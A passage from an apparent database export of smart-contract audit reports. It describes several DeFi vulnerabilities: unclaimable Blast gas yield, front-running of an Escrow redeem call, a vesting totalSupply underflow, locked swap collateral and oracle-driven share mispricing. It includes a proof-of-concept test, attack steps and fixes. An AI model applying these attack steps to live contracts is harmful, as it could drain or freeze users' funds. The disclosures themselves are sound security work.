The protocol is meant to be deployed on blast, meaning that the gas and ether balance accrue yield.

By default these yield settings for both ETH and GAS yields are set to VOID as default, meaning that unless we configure the yield mode to claimable, we will be unable to recieve the yield. The protocol never sets gas to claimable for the modules, and the governor of the contract is the auction house, the auction house also does not implement any function to set the modules gas yield to claimable.

```solidity
 constructor(address auctionHouse_) LinearVesting(auctionHouse_) BlastGas(auctionHouse_) {}
```
The constructor of  both BlastLinearVesting and BlastEMPAM set the auction house here 
`BlastGas(auctionHouse_)` if we look at this contract we can observe the above.

BlastGas.sol
```solidity
    constructor(address parent_) {
        // Configure governor to claim gas fees
        IBlast(0x4300000000000000000000000000000000000002).configureGovernor(parent_);
    }
```

As we can see above, the governor is set in constructor, but we never set gas to claimable. Gas yield mode will be in its default mode which is VOID, the modules will not accue gas yields. Since these modules never set gas yield mode to claimable, the auction house cannot claim any gas yield for either of the contracts. Additionally the auction house includes no function to configure yield mode, the auction house contract only has a function to claim the gas yield but this will revert since the yield mode for these module contracts will be VOID.
## Impact
Gas yields will never acrue and the yield will forever be lost
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/blast/modules/BlastGas.sol#L11
## Tool used

Manual Review

## Recommendation
change the following in BlastGas contract, this will set the gas yield of the modules to claimable in the constructor and allowing the auction house to claim gas yield.

```solidity
interface IBlast {
   function configureGovernor(address governor_) external;
   function configureClaimableGas() external; 
}

abstract contract BlastGas {
    // ========== CONSTRUCTOR ========== //

    constructor(address parent_) {
        // Configure governor to claim gas fees
       IBlast(0x4300000000000000000000000000000000000002).configureClaimableGas();
       IBlast(0x4300000000000000000000000000000000000002).configureGovernor(parent_);
    }
}
```



## Discussion

**nevillehuang**

Valid, due to this [comment](https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/blast/modules/BlastGas.sol#L12) within the contract indicating interest in claiming gas yield but it can never be claimed

**sherlock-admin4**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Axis-Fi/moonraker/pull/144


**10xhash**

> The protocol team fixed this issue in the following PRs/commits: [Axis-Fi/moonraker#144](https://github.com/Axis-Fi/moonraker/pull/144)

Fixed
Now `configureClaimableGa()` is invoked inside constructor

**sherlock-admin4**

The Lead Senior Watson signed off on the fix.",Axis Finance,Aymen0909|merlin|sl1|ether\_sky|hash|irresponsible|no,HIGH,,43000 USDC,0,0,0,https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/26,,,https://app.sherlock.xyz/audits/contests/206,solodit_reports,,2024-04-25 21:12:22,2024-10-15 01:42:25,1,// Configure governor to claim gas fees,
1745567,892b6a6139b6ea8cb42847031bbf468d,Front-Running redeem Can Prevent Indexers From Receiving Rewards for Allocations,OpenZeppelin,2023-09-20,"The [`redeem`](https://github.com/semiotic-ai/timeline-aggregation-protocol-contracts/blob/d8795c747d44da90f7717b3db9a08698e64a9b2f/src/Escrow.sol#L366) function in `Escrow.sol` enables Indexers to receive query rewards by submitting a signed Receipt Aggregate Voucher (RAV) and `allocationIDProof`. However, anyone who knows the contents of a valid `signedRAV` and `allocationIDProof` can call `redeem` regardless of whether the proof and signed RAV belong to them. This is because `redeem` only checks that the contents and signature of the passed-in `signedRAV` and `allocationIDProof` are valid, but does not check that the caller is the originator of the signatures and calldata. Additionally, the function uses the caller to [determine the amount of GRT](https://github.com/semiotic-ai/timeline-aggregation-protocol-contracts/blob/d8795c747d44da90f7717b3db9a08698e64a9b2f/src/Escrow.sol#L377-L384) that will be sent as the query reward to the `Staking` contract.


Consequently, a malicious user who knows a valid `signedRAV` and `allocationIDProof` can call `redeem`, which, if the user does not have a GRT balance in the `Escrow` contract, will result in zero GRT being rewarded for an `allocationID`. This also prevents future calls to `redeem` that correspond to the same `allocationID` as the ID will have been [marked as used](https://github.com/semiotic-ai/timeline-aggregation-protocol-contracts/blob/d8795c747d44da90f7717b3db9a08698e64a9b2f/src/AllocationIDTracker.sol#L65) in the `AllocationIDTracker` as part of the [`redeem` function's logic](https://github.com/semiotic-ai/timeline-aggregation-protocol-contracts/blob/d8795c747d44da90f7717b3db9a08698e64a9b2f/src/Escrow.sol#L390-L394). This effectively prevents an Indexer from being rewarded for a given `allocationID`. The following example outlines a proposed attack against an Indexer:


1. An Indexer calls `redeem` with their `signedRAV` and `allocationIDProof` on the Ethereum Mainnet.
2. A malicious user sees the proposed transaction in the public mempool, creates a duplicate transaction using the now public information, and pays to front-run the Indexer's transaction.
3. The malicious user's call to redeem happens first, and because they do not have any GRT balance in the `Escrow` contract, zero GRT will be awarded to the `allocationID` via the [collect](https://github.com/semiotic-ai/timeline-aggregation-protocol-contracts/blob/d8795c747d44da90f7717b3db9a08698e64a9b2f/src/Escrow.sol#L395) call. Note that both `redeem` and `collect` (in `Staking.sol`) will pass even though zero GRT is awarded to an Indexer. Additionally, this uses the `allocationID` in the `AllocationIDTracker` contract.
4. The Indexer's redeem call happens and fails because `useAllocationID` will now revert.


Consider deriving the Indexer address to pull GRT from via the `getAllocation` function in the Staking contract instead of using the `msg.sender` as the expected address in the `redeem` function. This prevents the wrong address' `EscrowAccount` 's GRT balance from being used and always ensures that regardless of who calls `redeem`, the correct address will be used when moving GRT to the `Staking` contract.


***Update:** Resolved in [pull request #58.](https://github.com/semiotic-ai/timeline-aggregation-protocol-contracts/pull/58) The Graph's core developers stated:*



> *Thank you for finding and highlighting this critical issue. We have investigated it further and discussed a few solutions. To prevent possible front-running attacks and allow the vesting contracts to redeem, we decided to proceed with the suggested solution to use the Indexer indicated in the allocation as the receiver (i.e., obtaining the receiver address from the staking contract using `allocationID`). The associated issue can be found [here](https://github.com/semiotic-ai/timeline-aggregation-protocol-contracts/issues/31).*",The Graph Timeline Aggregation Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/thegraph-timeline-aggregation-audit,,,solodit_reports,9b2307f78f9faf6bb5f793a632710079,2024-05-28 00:16:10,2024-10-15 00:27:51,1,"function redeem(
```
        address receiver = msg.sender;
        address allocationId = signedRAV.rav.allocationId;

        // Amount is the minimum between the amount owed on rav and the actual balance
        uint256 amount = signedRAV.rav.valueAggregate >
            escrowAccounts[sender][receiver].balance
            ? escrowAccounts[sender][receiver].balance
            : signedRAV.rav.valueAggregate;
```
        _sendersUsedAllocationIDs[sender][allocationID] = true;
```
        allocationIDTracker.useAllocationID(
            sender,
            allocationId,
            allocationIDProof
        );
```
        staking.collect(amount, allocationId);",
1745695,605f366fe270bb35f510aec775691051,H-3: User cannot withdraw stakingToken due to incorrect calculation of _totalSupply,Sherlock,2024-04-25,"# Issue H-3: User cannot withdraw stakingToken due to incorrect calculation of _totalSupply 

Source: https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/31 

## Found by 
0xAnmol, 0xvj, 9oelm, AMOW, Afriaudit, Audinarey, Aymen0909, CL001, Dliteofficial, Drynooo, Ironsidesec, JigglypuffAndPikachu, KingNFT, Ruhum, Shield, SilverChariot, Tendency, Varun\_05, amar, araj, asui, beWater0given, denzi\_, dimulski, forgebyola, lemonmon, marchev, mt030d, rbserver, saidam017, sakshamguruji, samuraii77, sl1, supercool, t0x1c, zarkk01
## Summary
User cannot withdraw `stakingToken` due to incorrect calculation of `_totalSupply`

## Vulnerability Detail
Given:

1.userA VestingSchedule` amountToVest`= 20 ether ,`daysToCliff`=30 , `daysToVest`=120

2.userB VestingSchedule `amountToVest`= 30 ether , `daysToCliff`=30, `daysToVest`=120
_totalSupply =20 +30= 50

3.skip 60 days  userB withdraw (`amountWithdrawable =15`)
_totalSupply = 50-15=35

4.`revoke` userB `VestingSchedule` 
_totalSupply = 35-30=5
https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewardsVesting.sol#L451

5.skip 60 days (120 days later)
userA withdraw `(amountWithdrawable =20`)
_totalSupply = 5-20 lead to revert
https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewardsVesting.sol#L508


POC:
src/TESTS_Core/Test_ZivoeRewardsVesting.sol
```solidity

    function testpoc() public{
        assert(zvl.try_createVestingSchedule(
            address(vestZVE), 
            address(qcp), 
            30, 
            120,
            20 ether, 
            true
        ));
        assert(zvl.try_createVestingSchedule(
            address(vestZVE), 
            address(pam), 
            30, 
            120,
            30 ether, 
            true
        ));


        hevm.warp(block.timestamp + 60 days);

        vestZVE.amountWithdrawable(address(pam));
        //pam withdraw
         hevm.startPrank(address(pam));
        vestZVE.withdraw();
        hevm.stopPrank();
        vestZVE.totalSupply();

        //revokeVesting
        hevm.startPrank(address(zvl));
        vestZVE.revokeVestingSchedule(address(pam));
        hevm.stopPrank();
        vestZVE.totalSupply();

        //qcp withdraw
        hevm.warp(block.timestamp + 60 days);
        vestZVE.amountWithdrawable(address(qcp));
         hevm.startPrank(address(qcp));
        vestZVE.withdraw();
        hevm.stopPrank(); 
    }
[FAIL. Reason: panic: arithmetic underflow or overflow (0x11)] testpoc() (gas: 795816)
```

## Impact
User cannot withdraw stakingToken

## Code Snippet
https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewardsVesting.sol#L451
## Tool used

Manual Review

## Recommendation
```solidity
   function revokeVestingSchedule(address account) external updateReward(account) onlyZVLOrITO nonReentrant {
        require(
            vestingScheduleSet[account], 
            ""ZivoeRewardsVesting::revokeVestingSchedule() !vestingScheduleSet[account]""
        );
        require(
            vestingScheduleOf[account].revokable, 
            ""ZivoeRewardsVesting::revokeVestingSchedule() !vestingScheduleOf[account].revokable""
        );
        
        uint256 amount = amountWithdrawable(account);
        uint256 vestingAmount = vestingScheduleOf[account].totalVesting;

        vestingTokenAllocated -= amount;

        vestingScheduleOf[account].totalWithdrawn += amount;
        vestingScheduleOf[account].totalVesting = vestingScheduleOf[account].totalWithdrawn;
        vestingScheduleOf[account].cliff = block.timestamp - 1;
        vestingScheduleOf[account].end = block.timestamp;

        vestingTokenAllocated -= (vestingAmount - vestingScheduleOf[account].totalWithdrawn);

     -  _totalSupply = _totalSupply.sub(vestingAmount);
     + _totalSupply = _totalSupply.sub(amount);
```



## Discussion

**pseudonaut**

Valid

**sherlock-admin3**

1 comment(s) were left on this issue during the judging contest.

**panprog** commented:
> high. Incorrect (reduced) totalSupply will make late users being unable to claim their reward



**pseudonaut**

Recommended suggestion seems invalid, example (only one vesting schedule):

`1,000` initial vesting schedule
`200` claimed already
`100` claimable

As a result of the 200 claimed already, totalSupply() should have decreased from `1000` -> `800`

Given current logic, once the vesting schedule is revoked, it would reduce totalSupply() by amount only, from `800` -> `700` ... this leaves surplus of stake ... it should reduce total by the full amount of `800` so that totalSupply() at the end is `0` not `700`

Calculation (as suggested in other PR) should be as follows:

```solidity
_totalSupply = _totalSupply.sub(vestingAmount - vestingScheduleOf[account].totalWithdrawn + amount);
```

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Zivoe/zivoe-core-foundry/pull/268",Zivoe,Ruhum|rbserver|Aymen0909|lemonmon|KingNFT|sakshamguruji|saidam017|0xvj|Tendency|sl1|Audinarey|dimulski|asui|marchev|araj|t0x1c|Drynooo|CL001|Varun\_05|Dliteofficial|Afriaudit|forgebyola|denzi\_|AMOW|Ironsidesec|Shield|zarkk01|mt030d|beWater0given|amar|9oelm|SilverChariot|0xAnmol|supercool|JigglypuffPikachu|samuraii77,HIGH,,47500 USDC,0,0,0,https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/31,,,https://app.sherlock.xyz/audits/contests/280,solodit_reports,,2024-05-28 01:22:15,2024-10-15 01:47:39,1,,
1746055,896307764bb1be2da22c8664b337822b,"[H-03] When harvesting a strategy and adjusting the debt, all the leftover collateral that is not used to swap the withdrawn collateral from Aave for WETH to repay the flashloan will be locked and lost in the Strategy contract",Code4rena,2024-05-20,"### Impact

Collateral can be locked and lost in the Strategy contract.

### Proof of Concept

When harvesting a strategy and adjusting the debt to maintain the loan to value of the strategy, the strategy does the following steps:

1.  Computes the deltaDebt required to readjust the loan to value within the accepted boundaries.
2.  Takes a WETH flashloan on Balancer for the exact deltaDebt amount.
3.  Repays WETH on Aave for the exact amount that was flashloaned borrowed on Balancer.
4.  Uses the UniQuoterV2 to compute the amount of collateral needed to repay the flashloan (including the flashloan fees).
5.  Withdraws collateral from Aave for exact amount computed by the UniQuoterV2.
6.  Does an `EXACT_OUTPUT` swap on Uniswap. It requests to receive the exact `debtAmount + fees` (to repay the flashloan) in exchange for at most the withdrawn amount of collateral from Aave.
7.  Does a couple of extra checks and finally the flashloan is repaid.

The problem identified on this report is caused due to some issues in the steps 4 & 6. Let's dive into it.

The ***first part of the problem*** is caused due to how the UniQuoter is invoked. [The `fee` of the pool that is sent to the UniQuoter is hardcoded to be `500`](https://github.com/code-423n4/2024-05-bakerfi/blob/main/contracts/core/strategies/StrategyLeverage.sol#L545-L547), which represents a pool of (0.05\% fee). This can cause two problems:

1.  The execution can be reverted if there is not an existing pool for the COLLATERAL/WETH at a 0.05\% fee. The UniQuoter will receive the call and will derive the address of the pool based on the tokenIn, tokenOut and fee. **If there is not a pool for the 0.05\% fee (500), the call will be reverted and the whole harvesting execution will blown up.**

2.  The second problem is when the `swapFeeTier` is different than 500, or in other words, that the fee of the UniPool that is configured for the strategy is different than 500 (0.05\%), for example, if the strategy is configured to work with a pool with a fee of 0.01\% (100).

*   In this case, the execution won't revert, but the computed amount will be bigger than what is really required. For example:
    *   The `debtAmount + fee` to repay the flashloan is 100WETH.
    *   The UniQuoter will compute how much collateral is required to get 100WETH by swapping the collateral on a UniPool with a 0.05\% fee. to make calculations easier, assume collateral and weth have a 1:1 conversion.
        *   100 collateral + 0.05\% fee charged by the pool ===> 100 + 0.5 ===> 100.5 Collateral.
    *   Then, the execution will withdraw from Aave the computed amount by the UniQutoer (100.5).
    *   Now, once the Strategy has the 100.5 collateral on its balance, the execution will do a swap requesting 100 WETH to repay the flashloan. When requesting the swap, the fees of the pool where the swap will be actually executed is set by using the `swapFeeTier`. Assume the Strategy is configured to work with the UniPool with the lowest fee available (0.01\%).
        *   To do an `EXACT_OUTPUT` swap on a pool with 0.01\% fee for 100 WETH, the required amount of tokenIn (collateral) will be:
            *   100 WETH + 0.01\% fee charged by the pool ===> 100 + 0.1 ===> 100.1 Collateral.
        *   This means, **after doing the swap for WETH to repay the flashloan, the Strategy will have on its balance a total of 0.4 leftover collateral that was not used during the swap.**

[`StrategyLeverage._payDebt() function`](https://github.com/code-423n4/2024-05-bakerfi/blob/main/contracts/core/strategies/StrategyLeverage.sol#L542-L568)

```
    function _payDebt(uint256 debtAmount, uint256 fee) internal {
      ...

      // Get a Quote to know how much collateral i require to pay debt
      (uint256 amountIn, , , ) = uniQuoter().quoteExactOutputSingle(
          //@audit-issue => The computed `amountIn` is based on a pool with fees of 0.05%!
          IQuoterV2.QuoteExactOutputSingleParams(ierc20A(), wETHA(), debtAmount + fee, 500, 0)
      );    
      
      //@audit-info => Withdraws the exact computed `amountIn` by the UniQuoter
      _withdraw(ierc20A(), amountIn, address(this) );

      uint256 output = _swap(
          ISwapHandler.SwapParams(
              ierc20A(),
              wETHA(),
              ISwapHandler.SwapType.EXACT_OUTPUT,
              amountIn,
              debtAmount + fee,
              //@audit-info => The swap is performed on a pool with this fees
              //@audit-issue => When this value is lower than 500 (Using a pool with a lower fee), not all the withdrawn collateral will be used for the swap!
              _swapFeeTier,
              bytes("""")
          )
      );
      ...
    }
```

Now comes the ***second part of the problem***, [the Strategy checks if there is any leftover collateral after the swap, and if there is any, it does a self transfer for the leftover amount](https://github.com/code-423n4/2024-05-bakerfi/blob/main/contracts/core/hooks/UseSwapper.sol#L95-L97). This can cause one of these two problems:

1.  The most problematic is that the leftover collateral will simply be left in the Strategy, it won't be re-supplied to Aave, neither pull out of the Strategy, it will be simply left in the Strategy's balance, from where it will be irrecoverable. Meaning, the leftover collateral will be locked in the Strategy contract.

2.  Depending on the Collateral's contract, there are some ERC20s that reverts the execution if they receive a self-transfer of tokens.

[`UseSwapper._swap() function`](https://github.com/code-423n4/2024-05-bakerfi/blob/main/contracts/core/hooks/UseSwapper.sol#L57-L101)

```
    function _swap(
        ISwapHandler.SwapParams memory params
    ) internal override returns (uint256 amountOut) {
        ...

        // Exact Input
        if (params.mode == ISwapHandler.SwapType.EXACT_INPUT) {
            ...
            // Exact Output
        } else if (params.mode == ISwapHandler.SwapType.EXACT_OUTPUT) {
          //@audit-info => Does an EXACT_OUTPUT swap
          //@audit-info => `amountIn` represents the exact amount of collateral that was required to swap the requested amount of WETH to repay the flashloan!
            uint256 amountIn = _uniRouter.exactOutputSingle(
                IV3SwapRouter.ExactOutputSingleParams({
                    tokenIn: params.underlyingIn,
                    tokenOut: params.underlyingOut,
                    fee: fee,
                    recipient: address(this),
                    amountOut: params.amountOut,
                    amountInMaximum: params.amountIn,
                    sqrtPriceLimitX96: 0
                })
            );
          
          //@audit-issue => Self transfering the leftover collateral after the swap. This leftover collateral will be left in the Strategy's balance, causing it to be unnusable.
            if (amountIn < params.amountIn) {
                IERC20(params.underlyingIn).safeTransfer(address(this), params.amountIn - amountIn);
            }
            
            ...
        }
    }
```

To recapitulate the most important points, the biggest impact because of the two problems on steps 4 & 6 is when the UniPool configured for the strategy uses a lower fee than 0.05\% (500). In this case, the leftover collateral after doing the `EXACT_OUTPUT` swap for the required amount of WETH to repay the flashloan will be left and locked in the Strategy.

### Tools Used

Manual Audit, [Uniswap Pool's Explorer](https://app.uniswap.org/explore/pools/ethereum?chain=mainnet), & [UniV2Quoter contract](https://github.com/Uniswap/v3-periphery/blob/main/contracts/lens/QuoterV2.sol#L197-L228)

### Recommended Mitigation Steps

To address this problem, I'd recommend to apply the two below suggestions.

1.  Do not set a hardcoded value for the pool fee when calling the UniQuoter, instead, send the same value of the configured pool (`swapFeeTier`).
2.  Instead of doing the self transfer of the leftover collateral after the swap, opt to re-supply it to Aave. In this way, that leftover collateral can still be managed by the Strategy.

**[0xleastwood (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-05-bakerfi-findings/issues/38#issuecomment-2166514308):**
 > This seems to predominantly impact yield in two ways:
> - Harvest function fails to be callable, but users can still withdraw collateral.
> - Harvest does not fail but there is some value leakage that happens over time.
> 
> Neither of these impact user's funds directly so `medium` severity seems right.

**[0xStalin (warden) commented](https://github.com/code-423n4/2024-05-bakerfi-findings/issues/38#issuecomment-2166958207):**
 > Hello Judge @0xleastwood - I'd like to clarify the second point raised in your comment to downgrade the severity of this report to medium:<br>
> 
> > Harvest does not fail but there is some value leakage that happens over time.<br>
> Neither of these impact user's funds directly so medium severity seems right.
> 
> Actually, when harvest does not fail, and causes the leftover collateral to be left sitting on the protocol, those funds are actually the funds deposited by the users. While it is true that the leakage happens over time, those funds are user funds, not only yield.
> 
> I'd like to ask if you could take a second look at your verdict for the severity of this report and if you would consider re-assigning the original severity based on this clarification.

**[0xleastwood (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-05-bakerfi-findings/issues/38#issuecomment-2182020097):**
 > @0xStalin - I see what you mean, even though the amount is somewhat on the smaller side, a debt adjustment will leave some excess collateral stuck as it rebalances to maintain a target LTV.

**[hvasconcelos (BakerFi) confirmed](https://github.com/code-423n4/2024-05-bakerfi-findings/issues/38#event-13239505929)**

**[ickas (BakerFi) commented](https://github.com/code-423n4/2024-05-bakerfi-findings/issues/38#issuecomment-2167784451):**
 > Fixed → https://github.com/baker-fi/bakerfi-contracts/pull/42



***",BakerFi,rvierdiiev|bin2chen|0xStalin,HIGH,,28500,0,0,0,https://github.com/code-423n4/2024-05-bakerfi-findings/issues/38,https://code4rena.com/reports/2024-05-bakerfi,,https://code4rena.com/reports/2024-05-bakerfi,solodit_reports,09a5b7847500650a2dd2c938a2527f08,2024-06-28 01:40:05,2024-10-15 01:54:06,1,"(uint256 amountIn, , , ) = uniQuoter().quoteExactOutputSingle(
            IQuoterV2.QuoteExactOutputSingleParams(ierc20A(), wETHA(), debtAmount + fee, 500, 0)
        );    
```
      function _payDebt(uint256 debtAmount, uint256 fee) internal {
        _repay(wETHA(), debtAmount);
        // Get a Quote to know how much collateral i require to pay debt
        (uint256 amountIn, , , ) = uniQuoter().quoteExactOutputSingle(
            IQuoterV2.QuoteExactOutputSingleParams(ierc20A(), wETHA(), debtAmount + fee, 500, 0)
        );    
        
        _withdraw(ierc20A(), amountIn, address(this) );

        uint256 output = _swap(
            ISwapHandler.SwapParams(
                ierc20A(),
                wETHA(),
                ISwapHandler.SwapType.EXACT_OUTPUT,
                amountIn,
                debtAmount + fee,
                _swapFeeTier,
                bytes("""")
            )
        );
        // When there are leftovers from the swap, deposit then back
        uint256 wethLefts = output > (debtAmount + fee) ? output - (debtAmount + fee) : 0;
        if (wethLefts > 0) {
            _supply(wETHA(), wethLefts);
        }
        emit StrategyUndeploy(msg.sender, debtAmount);
    }
```
            if (amountIn < params.amountIn) {
                IERC20(params.underlyingIn).safeTransfer(address(this), params.amountIn - amountIn);
            }
```
    function _swap(
        ISwapHandler.SwapParams memory params
    ) internal override returns (uint256 amountOut) {
        if (params.underlyingIn == address(0)) revert InvalidInputToken();
        if (params.underlyingOut == address(0)) revert InvalidOutputToken();
        uint24 fee = params.feeTier;
        if (fee == 0) revert InvalidFeeTier();

        // Exact Input
        if (params.mode == ISwapHandler.SwapType.EXACT_INPUT) {
            amountOut = _uniRouter.exactInputSingle(
                IV3SwapRouter.ExactInputSingleParams({
                    tokenIn: params.underlyingIn,
                    tokenOut: params.underlyingOut,
                    amountIn: params.amountIn,
                    amountOutMinimum: 0,
                    fee: fee,
                    recipient: address(this),
                    sqrtPriceLimitX96: 0
                })
            );
            if (amountOut == 0) {
                revert SwapFailed();
            }
            emit Swap(params.underlyingIn, params.underlyingOut, params.amountIn, amountOut);
            // Exact Output
        } else if (params.mode == ISwapHandler.SwapType.EXACT_OUTPUT) {
            uint256 amountIn = _uniRouter.exactOutputSingle(
                IV3SwapRouter.ExactOutputSingleParams({
                    tokenIn: params.underlyingIn,
                    tokenOut: params.underlyingOut,
                    fee: fee,
                    recipient: address(this),
                    amountOut: params.amountOut,
                    amountInMaximum: params.amountIn,
                    sqrtPriceLimitX96: 0
                })
            );
            if (amountIn < params.amountIn) {
                IERC20(params.underlyingIn).safeTransfer(address(this), params.amountIn - amountIn);
            }
            emit Swap(params.underlyingIn, params.underlyingOut, amountIn, params.amountOut);
            amountOut = params.amountOut;
        }
    }
```
    function quoteExactOutputSingle(QuoteExactOutputSingleParams memory params)
        public
        override
        returns (
            uint256 amountIn,
            uint160 sqrtPriceX96After,
            uint32 initializedTicksCrossed,
            uint256 gasEstimate
        )
    {
        bool zeroForOne = params.tokenIn < params.tokenOut;
        IUniswapV3Pool pool = getPool(params.tokenIn, params.tokenOut, params.fee);

        // if no price limit has been specified, cache the output amount for comparison in the swap callback
        if (params.sqrtPriceLimitX96 == 0) amountOutCached = params.amount;
        uint256 gasBefore = gasleft();
        try
            pool.swap(
                address(this), // address(0) might cause issues with some tokens
                zeroForOne,
                -params.amount.toInt256(),
                params.sqrtPriceLimitX96 == 0
                    ? (zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)
                    : params.sqrtPriceLimitX96,
                abi.encodePacked(params.tokenOut, params.fee, params.tokenIn)
            )
        {} catch (bytes memory reason) {
            gasEstimate = gasBefore - gasleft();
            if (params.sqrtPriceLimitX96 == 0) delete amountOutCached; // clear cache
            return handleRevert(reason, pool, gasEstimate);
        }
    }",
1775077,b033a28de46d37b1144861c41af0ce87,[FIXED] Elevated price in USD in the `getLiquidityTokenPrice` function leads to money theft from the pool in `ZunamiStratBase`,Oxorio,2024-02-06,"##### Location
File | Location | Line
--- | --- | ---
[ZunamiStratBase.sol](https://github.com/ZunamiProtocol/ZunamiProtocolV2/tree/8bc108201bef8c4d341ecd3a29a3b1d975019cec/contracts/strategies/ZunamiStratBase.sol#L71 ""/contracts/strategies/ZunamiStratBase.sol"") | contract `ZunamiStratBase` > function `deposit` | 71

##### Description
In the `deposit` function of the `ZunamiStratBase` contract, the cost of Curve pool LP tokens in USD is determined based on the current price received from the oracle. This value is then used in the `processSuccessfulDeposit` function for minting shares. The issue arises because a higher current price of the LP token results in a larger share of the total LP tokens for a user, while the price change does not impact the shares of previous users.

In the strategy, within the `deposit` function, liquidity is deposited into the Curve pool, which returns LP tokens. The amount of these LP tokens is set in the `depositedLiquidity` variable. Finally, the USD value of the LP tokens is returned to `zunamiPool`, calculated based on the current price provided by the oracle:
```solidity
function deposit(uint256[POOL_ASSETS] memory amounts) external returns (uint256) {
	// ...
	uint256 liquidity = depositLiquidity(amounts);
	depositedLiquidity += liquidity;
	return calcLiquidityValue(liquidity);
}
```

In `zunamiPool`, shares are minted based on the USD value of this LP tokens. However, these new shares are allocated without considering the USD value of previously minted shares in the pool according to the new price:

```solidity
	// ...
	minted =
		((totalSupply() + 10 ** _decimalsOffset()) * depositedValue) /
		(totalDeposited + 1);
}
_mint(receiver, minted - locked);
_strategyInfo[sid].minted += minted;

totalDeposited += depositedValue;
```

For example:
1) The first user deposits `10000` `zunUSD`, the strategy is receiving `10000` LP tokens from the Curve pool. These LP tokens are recorded in the strategy in the `depositedLiquidity` variable. The cost of these LP tokens in USD, as returned from the oracle, is assumed to be 1 USD per token:

```
	getLiquidityTokenPrice = 1 (USD)
	strategy.depositedLiquidity = 10000 (LP)
	zunamiPool.minted = 10000 (shares)
	zunamiPool.totalDeposited = 10000 (USD)
```
2) A second user deposits `1000` `zunUSD`, the strategy is receiving `1000` LP tokens. If the price per LP token has risen to `1.2` USD, the `deposit` function returns `1200` USD. The shares in `zunamiPool` remain unchanged due to the LP token price change:

```
	getLiquidityTokenPrice = 1.2 (USD)
	strategy.depositedLiquidity = 11000 (LP)
	zunamiPool.minted = 11200 (shares)
	zunamiPool.totalDeposited = 11200 (USD)
```
3) The second user withdraws their `1200` shares. The `calcRatioSafe` function determines the user's claim to be `1200/11200 = 0.107` of `strategy.depositedLiquidity`, equating to `0.107 * 11000 = 1177` LP tokens. Exchanging these tokens in the Curve pool yields `1177` `zunUSD`:

```
	strategy.depositedLiquidity = 9823 (LP)
	zunamiPool.minted = 10000 (shares)
	zunamiPool.totalDeposited = 10000 (USD)
```

As a result, the second user profits `177` `zunUSD` from the `deposit` and `withdraw` functions, causing a loss for the first user.

##### Recommendation
We recommend adjusting the allocation of new shares during a deposit in `zunamiPool` to consider the current value of shares in USD.

##### Update

###### Zunami's response
Fixed in commit [`9ffa8e1b6128d1ade8459a4e492cee669ed241a1`](https://github.com/ZunamiProtocol/ZunamiProtocolV2/tree/9ffa8e1b6128d1ade8459a4e492cee669ed241a1/).

###### Oxorio's response
Made solution not fully fixes bug scenario in case of `ThroughController` usage:
1) The first user deposits `10000` `DAI`, the strategy is receiving `10000` LP tokens from the Curve pool. These LP tokens are recorded in the strategy in the `depositedLiquidity` variable. The cost of these LP tokens in USD, as returned from the oracle, is assumed to be 1 USD per token:

```
	getLiquidityTokenPrice = 1 (USD)
	strategy.depositedLiquidity = 10000 (LP)
	zunamiPool.minted = 10000 (shares)
	zunamiPool.totalDeposited = 10000 (USD)
```
2) A second user deposits `1000` `DAI`, the strategy is receiving `1000` LP tokens. If the price per LP token has risen to `1.2` USD, the `deposit` function returns `1200` USD. Also, the new `extraGains` logic of `zunamiPool` mints `2000` new shares to the pool address:

```
	getLiquidityTokenPrice = 1.2 (USD)
	strategy.depositedLiquidity = 11000 (LP)
	zunamiPool.minted = 13200 = 10000 + 2000 (new shares for pool) + 1200 (new shares for depositer)
	zunamiPool.totalDeposited = 13200 (USD)
```
3) Let's assume that the price spike of `DAI` was short-lived and after a while, the price returned to `1` dollar. The first user withdraws their `10000` shares. The `calcRatioSafe` function determines the user's claim to be `10000/13200 = 0.758` of `strategy.depositedLiquidity`, equating to `0.758 * 11000 = 8338` LP tokens. Exchanging these tokens in the Curve pool yields `8338` `DAI`:

```
	strategy.depositedLiquidity = 2662 (LP)
	zunamiPool.minted = 3200 (shares)
	zunamiPool.totalDeposited = 3200 (USD)
```

As a result, the first user loses `1662` `DAI` from the `deposit` and `withdraw` function calls.


Also, the new `extraGains` logic mints shares at a [1 to 1 rate](https://github.com/ZunamiProtocol/ZunamiProtocolV2/blob/9ffa8e1b6128d1ade8459a4e492cee669ed241a1/contracts/ZunamiPool.sol#L140):
```
    uint256 gains = currentTotalHoldings - totalDeposited;
    extraGains += gains;
    totalDeposited += gains;
    extraGainsMintedBlock = block.number;
    _mint(address(this), gains);
```
But as the pool contract implements defense from inflation attack, it mints shares in a shifted rate [during deposit](https://github.com/ZunamiProtocol/ZunamiProtocolV2/blob/9ffa8e1b6128d1ade8459a4e492cee669ed241a1/contracts/ZunamiPool.sol#L236):
```
    minted = ((totalSupply() + 10 ** _decimalsOffset()) * depositedValue) / (totalDeposited + 1);
    ...
    _mint(receiver, minted);
```
We recommend using the same shifted rate for minting in the `extraGains` logic.

###### Zunami's second response
Fixed in commit [`79892fe12bec407d3d9706c19cd421d458263c0c`](https://github.com/ZunamiProtocol/ZunamiProtocolV2/tree/79892fe12bec407d3d9706c19cd421d458263c0c/).

